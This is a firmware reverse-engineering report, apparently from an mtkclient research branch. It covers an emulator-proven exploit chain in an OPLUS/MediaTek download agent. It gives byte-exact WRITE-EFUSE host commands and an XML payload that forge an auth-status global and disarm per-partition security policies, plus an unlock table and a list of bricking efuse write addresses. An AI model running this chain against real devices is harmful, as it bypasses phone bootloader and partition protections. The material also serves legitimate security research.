# RE: the full WRITE-EFUSE exploit chain on the 2710EX01 DA2 — unlock table, clamp, reversibility (Unicorn-proven)

Date: 2026-10-26. Artifact: `/tmp/opencode/fw2710/x/da2_2710.bin` (358,160 B, sha256
`f95f2b82…`, ARM32, VA base 0x40000000 = file offset 0), branch `oplus-mt6789-unlock`,
HEAD ed41226. Emulator: Unicorn 2.1.4 via `/tmp/opencode/efuse2710/harness.py`
(`DA2Emu`, reused unmodified) + the new driver **`docs/notes/da2_2710_efuse_chain.py`**
(modes `boot`, `forge`, `unlock-table`, `clamp-widen`, `full`; full log
`/tmp/opencode/efuse2710/chain_all_output.txt`, exit 0). **Emulator-only; no device, no
flashing, no efuse word touched. Every step below is execution evidence, not code reading.**

Companions: `re-da2-2710-efuse-2026-10-26.md` (the write-path audit this builds on),
`re-da2-2710-certchain-2026-10-26.md`, `re-oplus-auth-paths.md` (200EX01 ladder),
`re-heapbait-vuln.md` / `re-heapbait-stabilize.md` (200EX01 overflow mechanics).

## TL;DR

| question | verdict |
|---|---|
| Does CMD:WRITE-EFUSE need any prior auth? | **No per-command check** — but the command is not registered at boot. The boot-time registrar block (0x40001D24) registers only **9 commands** (no WRITE-EFUSE). WRITE-EFUSE/READ-EFUSE/GET-HW-INFO appear only after the SEC-POLICY ladder, and the EFUSE pair is registered **before and independent of** the `[g_oplus_auth_status]∈{3,4}` gate in the same block (gate at 0x40001AD0). |
| Forge `g_oplus_auth_status ← 5` | **works, rc=0, exactly ONE persistent 32-bit RAM write** (`0x40054C88←5`); differential write-log proof against an identical run with a scratch-target option. Fully reversible. |
| What does 5 unlock vs 1/2/4? | Exactly two runtime effects: (1) registrar gate passed (write family registered; 3/4 would suppress it), (2) **every partition→policy lookup collapses to the `oplus_single_mode` entry** — executed proof: `seccfg/lk/userdata/pro_info` policy flags 2 → 0, so the per-partition hash-id/hash-binding deny paths (`g_auth_required...`, rc `0xC0020004`) disarm for all partitions. The `==2` extra compare in the hash-list verifier (0x4000C140) is skipped. **No handler reads the status at dispatch time** (0 reads observed in 30 handler runs). |
| Clamp widen → heapbait on 2710? | **NO.** The packet-length global moved to **`[0x4006819C]`** (=0x40068188+0x14; round-1 named `0x40067A08+0x14` for 200EX01). Widening it (0x2000→0x100000 through the same WRITE-EFUSE primitive) changes the announced `packet_length` in DOWNLOAD-FILE (proven) but the oversized envelope is still rejected: `accepted=(cap 5116, pay 5116)` control vs `rejected=(cap 5116, pay 5132)` in BOTH baseline and widened runs. The 2710 clamp is `min(sb − r7, [0x4006819C])` and the envelope callback checks the packet against that clamped value — the 200EX01 stale-capacity flaw is gone. **Heapbait stays dead on 2710 even after the RAM write.** |
| Safest chain | legit SEC-POLICY session (the only door) → 1× WRITE-EFUSE forging 5 → full table + collapsed partition policies. Zero efuse-word writes, zero watchdog writes, zero flash writes; one DA-reload restores everything. |

New hard facts this session adds (corrections to earlier notes marked [CORRECTION]):

* [CORRECTION to `re-da2-2710-efuse-2026-10-26.md` §4] The debug-XML write path **requires
  `<verify>` AND `<read>` sections** — the fuzz corpus itself shows `shape: no-verify` and
  `shape: no-read` classify CTRL-only (BPKEY/reinit only, options never parsed). Minimal
  working shape: `<debug><write fsource vcore><verify><vcore>N</vcore></verify>
  <read fsource vcore/><extra><option address=…>N</option></extra></write></debug>`.
* [CORRECTION] "EFUSE commands are registered unconditionally at the top of the block" is
  true only **within the policy-success block**; at boot they are absent (§1).
* [CORRECTION to `re-penumbra-survey-2026-10-26.md` §4 open item] The 2710 value of the
  packet_length global lives at **`[0x4006819C]`**, and the DA provably reads it for both
  the DOWNLOAD-FILE `packet_length` field and the receive clamp.
* The boot value of `g_oplus_auth_status` is **3** — it comes from the loaded `.data`
  image itself (file offset 0x54C88 contains 0x00000003), no runtime writer needed.
  3 = "do not get oplus permission" (the most-locked registrable state).
* The 2710 policy table base is **0x400569B4** (64×32 B entries, `+0x16` flag byte,
  `+4/+8/+0xC/+0x10` name aliases); `oplus_single_mode` = entry **62**.
* Session ladder globals: `[0x400683A4]` set to 1 by SET-ALLINONE-SIGNATURE success,
  required by GET-DEV-FW-INFO; `[0x400683A8]` set to 1 by GET-DEV-FW-INFO success
  (store at 0x40006B0C), required by SET-FLASH-POLICY (`cmp r7,#1; bne` at 0x40006BB4).

---

## 1. Session preconditions — registrar walk (mode `boot`)

Three registration code blocks exist; the dynamic walk of the list at `0x40054ABC`
(node = `{next, len, name, ?, handler}`, registrar `0x400083DC`) gives:

**Boot-time set** — block `0x40001D24`, called from bootstrap2 (`0x40000EDC`, call at
`0x40000F40`, right after the `dagent_register_commands` log). 9 nodes:

```
CMD:GET-SYS-PROPERTY              0x400073E4      CMD:SECURITY-GET-DEV-FW-INFO   0x40006A44
CMD:NOTIFY-INIT-HW                0x40002194      CMD:SECURITY-SET-FLASH-POLICY  0x40006B8C
CMD:OPLUS-WRITE-HASH256-ID        0x40010A28      CMD:SECURITY-SET-ALLINONE-SIGNATURE 0x4000695C
CMD:OPLUS-GET-CPUID               0x40010AB8      CMD:OPLUS-STORAGE-INFO         0x40010BA8
CMD:UNKNOWN                       0x40002148
```

`g_oplus_auth_status = 3` at this point (from `.data`). **CMD:WRITE-EFUSE is NOT
dispatchable** — a plain "I just plugged the cable" attacker cannot reach the forge.

**The ladder to the full table** (all steps executed in the emu, mode `full` stages 0b.x):

```
CMD:SECURITY-SET-ALLINONE-SIGNATURE   (arg da/arg/source_file; fetch stubbed)
    success → [0x400683A4] = 1                       (executed: rc=buf ptr, flag=1)
CMD:SECURITY-GET-DEV-FW-INFO          (arg da/arg/target_file; requires [83A4]==1)
    success → sends devinfo to host, [0x400683A8] = 1  (store proven at 0x40006B0C;
    the devinfo build itself needs the HACC engine 0x1020xxxx — not modeled in emu)
CMD:SECURITY-SET-FLASH-POLICY         (arg da/arg/source_file; requires [83A8]==1)
    fetches the policy file (tag "SEC-POLICY"), verifies it (0x400076DC, RSA-2048
    e=65537, hardcoded modulus — see certchain note):
      unsigned policy → REPLY "Server is not authenticated. Locked." rc=0xE0000010
                        (EXECUTED in emu) and NO registration happens;
      verified policy → bl 0x40001A78 → full table registered.
```

**Registration matrix** (X = registered; policy-block = `0x40001A78` run after a
simulated verify outcome; full matrix in the mode output):

| command group | boot | policy blk, st=0 | st=3 | st=4 | st=5 |
|---|---|---|---|---|---|
| WRITE-EFUSE / READ-EFUSE / GET-HW-INFO | . | X | X | X | X |
| SECURITY-* (4) + OPLUS-* (3) + GET-SYS-PROPERTY + NOTIFY-INIT-HW + UNKNOWN | X | X | . | . | . |
| WRITE-PARTITION / WRITE-FLASH / WRITE-PARTITIONS | . | X | **.** | **.** | X |
| everything else (READ-*, ERASE-*, SET-*, DEBUG:UFS, EMMC-CONTROL, REBOOT, FLASH-ALL/UPDATE, WRITE-PRIVATE-CERT, GET-DA-INFO, GET-DOWNLOADED-IMAGE-FEEDBACK, SET-HOST-INFO) | . | X | . | X | X |

Gate code (static, matches the matrix): `0x40001AD0 ldr r0,[0x40054C88]; cmp #4; beq
skip-write-family; cmp #3; bne register-write-family; (==3) print "do not get oplus
permission" and RETURN` — status 3 registers nothing beyond the first three; status 4
("read back mode", print at 0x40041673) skips only the write family; **5 passes**.

**Answer to task 1:** WRITE-EFUSE has no auth query of its own anywhere between
registration and the raw `str` — but the *door* is the verified SEC-POLICY. There is no
keyless path to it on 2710: the boot table has no write primitive (OPLUS-WRITE-HASH256-ID
writes flash hashes, policy-gated; the fetch engine is clamped, §4), so the circular
"patch the verifier with WRITE-EFUSE first" idea has no starting point.

## 2. Step A — the forge (mode `forge`)

Host command (byte-exact):

```xml
<?xml version="1.0" encoding="utf-8"?><da><version>1.0</version><command>CMD:WRITE-EFUSE</command><arg><source_file>efuseimg</source_file></arg></da>
```

512-byte payload fetched for `source_file` (core 236 bytes, space-padded to 0x200):

```xml
<?xml version="1.0" encoding="utf-8"?><efuse><debug><write fsource="3000" vcore="1200"><verify><vcore>1200</vcore></verify><read fsource="3000" vcore="1200"/><extra><option address="0x40054C88">5</option></extra></write></debug></efuse>
```

Executed result (differential vs an identical run whose option targets scratch
`0x4046E000` — isolates the option's effect from handler noise):

```
handler rc = 0x0
persistent-RAM write diff: 0x40054C88 <- 0x00000005   <= THE FORGE   (nothing else)
efuse-controller writes (identical in both runs, control regs only):
  0x11C10008 <- 0x6B32970A   (BPKEY unlock)
  0x11C10008 <- 0x00000000   (BPKEY re-lock)
  0x11C10000 <- 0x5, 0x5     (controller reinit; emulated idle model)
efuse DATA-window (0x11C1xxxx word) writes: 0
g_oplus_auth_status now = 5
```

The 54 remaining diff bytes are the DA's own mxml/log buffers holding the ASCII of the
option address — session-local, present in both runs in nature. **Verdict: the reversible
payload is one 32-bit RAM write plus controller control-register pokes; no efuse word is
blown (the DATA window is untouched), and a DA reload restores the global.**

## 3. Step B — the unlock table (mode `unlock-table`)

Method: for every registered command (30 unique names — the table is complete), a fresh
emulator runs the real handler with a benign arg set, first at boot status 3 ("absent" =
not registered → not dispatchable), then in a fresh emulator after the **real**
`CMD:WRITE-EFUSE` forge to 5 + registrar re-run. `authRd` = observed reads of
0x40054C88 during the handler run (empty everywhere → no dispatch-time status checks).

| command | handler | boot | st3 | pre rc | post rc | verdict |
|---|---|---|---|---|---|---|
| CMD:DEBUG:UFS | 0x40006D5C | . | . | absent | 0xC0010001 | registration unlock |
| CMD:EMMC-CONTROL | 0x40006798 | . | . | absent | 0xC0010001 | registration unlock |
| CMD:ERASE-FLASH | 0x40003C38 | . | . | absent | 0xC0010001 | registration unlock |
| CMD:ERASE-PARTITION | 0x40003A64 | . | . | absent | 0xC0010001 | registration unlock |
| CMD:FLASH-ALL | 0x40004160 | . | . | absent | 0xC0010001 | registration unlock |
| CMD:FLASH-UPDATE | 0x40004AF8 | . | . | absent | 0xC0010001 | registration unlock |
| CMD:GET-DA-INFO | 0x40006668 | . | . | absent | 0xC0010001 | registration unlock |
| CMD:GET-DOWNLOADED-IMAGE-FEEDBACK | 0x40007304 | . | . | absent | 0xC0010001 | registration unlock |
| CMD:GET-HW-INFO | 0x40006200 | . | X | 0xC0010001 | 0xC0010001 | same (no-status gate) |
| CMD:GET-SYS-PROPERTY | 0x400073E4 | X | X | 0xC0010001 | 0xC0010001 | same |
| CMD:NOTIFY-INIT-HW | 0x40002194 | X | X | EXC | EXC | same (emu artifact both) |
| CMD:OPLUS-GET-CPUID | 0x40010AB8 | X | X | 0xC0010001 | 0xC0010001 | same |
| CMD:OPLUS-STORAGE-INFO | 0x40010BA8 | X | X | 0xC0010001 | 0xC0010001 | same |
| CMD:OPLUS-WRITE-HASH256-ID | 0x40010A28 | X | X | 0xC0010001 | 0xC0010001 | same |
| CMD:READ-EFUSE | 0x40005D04 | . | X | 0x0 (37-line dump) | 0x0 | same |
| CMD:READ-FLASH | 0x40003674 | . | . | absent | 0xC0010001 | registration unlock |
| CMD:READ-PARTITION | 0x40003554 | . | . | absent | 0xC0010001 | registration unlock |
| CMD:READ-PARTITION-TABLE | 0x400038A4 | . | . | absent | 0x0 | registration unlock |
| CMD:REBOOT | 0x40005E2C | . | . | absent | 0xC0010001 | registration unlock |
| CMD:SECURITY-GET-DEV-FW-INFO | 0x40006A44 | X | X | 0xC0010001 | 0xC0010001 | same |
| CMD:SECURITY-SET-ALLINONE-SIGNATURE | 0x4000695C | X | X | buf ptr (cached) | buf ptr | same |
| CMD:SECURITY-SET-FLASH-POLICY | 0x40006B8C | X | X | 0xC0010001 | 0xC0010001 | same |
| CMD:SET-BOOT-MODE | 0x40006008 | . | . | absent | 0xC0010001 | registration unlock |
| CMD:SET-HOST-INFO | 0x400021E8 | . | . | absent | 0x0 | registration unlock |
| CMD:UNKNOWN | 0x40002148 | X | X | 0xC0010003 | 0xC0010003 | same |
| CMD:WRITE-EFUSE | 0x40005C20 | . | X | 0xC0030007 | 0xC0030007 | same |
| CMD:WRITE-FLASH | 0x400030EC | . | . | absent | 0xC0010001 | registration unlock |
| CMD:WRITE-PARTITION | 0x400022B4 | . | . | absent | 0xC0010001 | registration unlock |
| CMD:WRITE-PARTITIONS | 0x40002818 | . | . | absent | 0xC0010001 | registration unlock |
| CMD:WRITE-PRIVATE-CERT | 0x400060D8 | . | . | absent | 0xC0040006 | registration unlock |

Notes on the two non-0xC0010001 post rows: READ-PARTITION-TABLE/SET-HOST-INFO return 0
(benign probe completed); WRITE-PRIVATE-CERT returns 0xC0040006 — it gets one stage
further post-registration; no AUTH read is involved (session-state difference from the
preceding registration run, not an auth-status gate). No "Security deny" path fired in
any probe: those denies (string 0x4004F70A "[Security deny … signature]. at [%s]", print
at 0x4002FB50; and the `g_auth_required/img_auth_required` + rc 0xC0020004 sites at
0x4000242C/0x400030CC/0x40004AA4/0x40005B44) are driven by the **per-partition policy
flags**, not by the auth status — which is exactly what status 5 changes (below).

**What 5 specifically enables vs 1/2/4** — the status has exactly four consumer sites
(exhaustive movw/movt scan, window-8): 0x40001AD0 (registrar, ∈{3,4} gate), 0x4000C140
(hash-list verify: `cmp #2` — status 2 requires an extra comparison against
`[0x4006A804]`, the value SET-FLASH-POLICY copies from `da/arg/preloader_sig_ver`;
status 5 skips it), 0x40010204/0x400105D4 (inside the verifier: writes 1/2, 3 on fail,
4 on tail[1]==0x1c, **5 on tail[0]==0x19 && status==1** at 0x40010680). Executed proof of
the lookup collapse (lookup `0x4002CDA8` + flag getter `0x4002CFFC`):

```
partition        pre status=3 (idx,flags)   post status=5 (idx,flags)
seccfg                (0, 2)                     (62, 0)
lk                    (2, 2)                     (62, 0)
boot                  (5, 0)                     (62, 0)
param                (61, 0)                     (62, 0)
oplusreserve2         (58, 0)                    (62, 0)
userdata              (18, 2)                    (62, 0)
pro_info               (0, 2)                    (62, 0)
```

At status 5 the lookup does not even compare the requested name — every partition
resolves to entry 62 (`oplus_single_mode`), whose flag byte (+0x16) is 0. Since the
hash-id write protections and hash_binding denies read exactly these flags, **status 5
disarms the per-partition policy layer for the whole table** — that is the practical
difference from 1/2 (which keep per-partition flags) and 3/4 (which lose the write
family entirely).

**Task 4a/4b (seccfg read / unlock-state write):** the DA-side gate that would deny
these is the partition policy layer, and it is now collapsed (flags 0, proven above);
the commands themselves dispatch (table rows). What the emulator cannot prove is the
flash I/O behind them (no storage model) — so the honest statement is: *the policy gate
that denies seccfg reads/writes on a locked device is disarmed by the forge; whether the
seccfg digest can then be read/verified offline is a flash-transport question, testable
on hardware with the same two commands.* The seccfg lock-state machinery itself
(anti-clone "MMMM" records, lock_state at record+0xC) is unchanged by the forge — the
forge does not touch it.

**Task 4d (WRITE-REGISTER replacement):** none needed and none possible — READ/WRITE-
REGISTER do not exist on 2710 (registrar-wide scan, strings absent). The equivalent
arbitrary read/write primitive **is** WRITE-EFUSE itself (write: any address; read: the
same XML's verify stage reads back and logs `0x%x != 0x%x`, and READ-EFUSE dumps the
37-register efuse window).

## 4. Step C — the clamp and heapbait (mode `clamp-widen`)

The single fetch engine on 2710 is `0x4002AFD8` (both WRITE-EFUSE and
SECURITY-SET-ALLINONE-SIGNATURE call it). Structure (static + executed):

* announces `CMD:DOWNLOAD-FILE` with `<packet_length>0x…</packet_length>` taken from
  **`[0x4006819C]`** (loaded at 0x4002B040 `ldr r7,[0x40068188+0x14]`, stored to the
  XML builder) — **executed**: with the global widened to 0x100000 the announced XML
  changes from `packet_length>0x2000` to `packet_length>0x100000`;
* mallocs `announce+4` (announce parsed from the host's `OK@<hex>` status line — the
  status tokenizer `0x40007FB0` splits on `'@'`, 2 tokens max);
* per data chunk: status read (0x40) then the clamped data read
  `request = min(sb − r7, [0x4006819C])` at 0x4002B2F4–B30C (200EX01 had the unclamped
  global here — that difference is the whole patch);
* the transport recv callback `0x4002AA28` checks the envelope
  `{magic 0xFEEE_EEEF, ?, payload_len}` against **that clamped request** (`[r5]` =
  `&[sp+0x7c]`) and rejects with 0xC0010006 (audit's envelope check at 0x4002AA88).

Executed (fake session with the REAL envelope callback; host modeled as a queue):

```
[0] control   announce 0x13FC, packet 0x13FC: accepted (cap 5116, pay 5116), rc=0 — model sane
[1] baseline  [PKTLEN]=0x2000, packet 0x140C: rejected (cap 5116, pay 5132) -> DA replies "ERR", rc=0xC0010001
[2] widened   [PKTLEN]=0x100000 (the value a forge would write), packet 0x140C:
              announced packet_length 0x100000, but rejected identically (cap 5116, pay 5132)
```

**Verdict: widening `[0x4006819C]` does NOT reopen heapbait on 2710.** The binding term
is `sb − r7` — the remaining space of the `malloc(announce+4)` buffer — and the announce
itself sizes that buffer, so capacity ≥ remaining for every accepted packet; a packet
larger than the remaining space is refused before any copy. The 200EX01 flaw (request =
unclamped global, callback capacity = stale 0x2000) is structurally absent. No
alternative fetch path exists on 2710 (single engine, verified by call-site check of
both consumers).

## 5. Safety analysis — reversibility of every variant

| WRITE-EFUSE variant | effect | reversible? |
|---|---|---|
| `option address="0x40054C88"` (auth status) | one RAM dword | **YES** — DA reload restores; the chain's core |
| `option address="0x4006819C"` (packet_length) | one RAM dword | **YES** — same (demonstrated; useless for heapbait) |
| `option address="0x400076DC"/"+4"` (verifier code words) | DA code RAM patch | **YES** in the RAM sense (reload restores), but it is a code modification — only defensible inside an authorized research session; NOT part of the recommended chain |
| `option address="0x11C10000-0x11C12000"` (any efuse DATA word, e.g. 0x11C10060 SBC) | **blows efuse bits (0→1 only)** | **NO — DANGEROUS/BRICKING** (sbc_en/daa_en/locks, pub-key hash words) |
| `option address="0x10007000"`-class (watchdog/RGU) | can reboot/kill the session mid-flow | dangerous to session state, not persistent — avoid |
| flash-mapped windows via storage commands | persistent device state | outside this chain; the chain contains none |
| the BPKEY/reinit pokes the engine always does (`0x11C10008`, `0x11C10000`) | controller control registers | benign by construction (no word addressed) |

**The demonstrated chain contains zero irreversible steps.** The dangerous class is any
`option address` inside 0x11C10000–0x11C12000 (except the two control regs the engine
touches anyway) — mtkclient must never emit those.

## 6. The safest full chain as host commands

```
# precondition (device): a legitimately OPLUS-signed SEC-POLICY session — the ONLY door:
#   CMD:SECURITY-SET-ALLINONE-SIGNATURE (any signed blob the device accepts)
#   -> CMD:SECURITY-GET-DEV-FW-INFO -> relay dev_info to the OPLUS server
#   -> CMD:SECURITY-SET-FLASH-POLICY with the server's signed policy
#   (boot table = 9 cmds, WRITE-EFUSE absent; unsigned policy -> "Server is not
#    authenticated. Locked.", rc=0xE0000010 — both executed in emu)
#
# step 1 (the whole exploit — one command, one RAM dword):
#   CMD:WRITE-EFUSE, arg <source_file>efuseimg</source_file>, then upload the
#   512-byte payload:
<?xml version="1.0" encoding="utf-8"?><efuse><debug><write fsource="3000" vcore="1200"><verify><vcore>1200</vcore></verify><read fsource="3000" vcore="1200"/><extra><option address="0x40054C88">5</option></extra></write></debug></efuse>
#   (spaces pad to exactly 512 bytes; rc=0; g_oplus_auth_status := 5)
#
# effect (all proven by execution):
#   - registrar gate passes (write family stays/becomes registered on any
#     subsequent SET-FLASH-POLICY success; already registered in a status-1/2 session)
#   - hash-list verifier's ==2 extra check skipped
#   - EVERY partition->policy lookup returns entry 62 'oplus_single_mode', flags 0
#     -> per-partition hash-id/hash-binding denies disarmed for all partitions
#
# reversibility: the only persistent effect is one RAM dword; re-booting the DA
# (BROM -> DA1 -> DA2) restores it. Nothing else in the chain persists.
```

## 7. What remains gated (honest list)

* The door itself: without an OPLUS-server-signed policy, WRITE-EFUSE is not even
  registered (boot table has no write primitive and the fetch clamp is closed) —
  **the forge does not help keyless attackers reach the table; it upgrades an already
  authorized session**.
* `CMD:SECURITY-SET-FLASH-POLICY` still requires `[0x400683A8]==1` (session stage) and
  a signature that verifies — forging 5 does not substitute for the signature (the
  verifier runs before the registrar and its failure path never reaches 0x40001A78).
* Flash I/O behind READ/WRITE-PARTITION (storage model absent in emu) — untested here;
  the DA-side policy denies that previously protected seccfg-class partitions are
  proven disarmed at status 5.
* The efuse SBC/DAA guard `0x40032DC4` (blocks blows on already-SBC-locked devices) is
  untouched by all of this — and must stay untouched.

## Reproduction

```
cd /root/mtkclient
/tmp/opencode/da1venv/bin/python docs/notes/da2_2710_efuse_chain.py all   # exit 0
# or per mode: boot | forge | unlock-table | clamp-widen | full
# requires /tmp/opencode/efuse2710/harness.py (unicorn 2.1.4) and
# /tmp/opencode/fw2710/x/da2_2710.bin
```

Confidence: high — every verdict above is backed by an executed emulator run with
recorded writes/replies/branch decisions; static quotes only corroborate. The emu-only
caveats are marked inline (HACC engine, storage layer, transport init value).
